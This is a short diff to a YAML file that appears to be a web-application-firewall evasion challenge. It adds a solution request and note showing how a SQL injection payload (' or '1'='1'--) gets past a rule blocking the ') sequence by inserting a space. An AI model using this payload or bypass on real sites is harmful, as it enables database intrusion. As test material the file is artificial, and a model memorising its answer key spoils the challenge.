@@ -16,6 +16,12 @@ base_request: |-
   GET /?search=nebula')%20or%20'1'='1'-- HTTP/1.1
   Host: localhost
 
+solution: |-
+  GET /?search=nebula'%20)%20or%20'1'='1'-- HTTP/1.1
+  Host: localhost
+
+solution_note: Add a space between the ')
+
 rules:
 # avoid ')
 - >
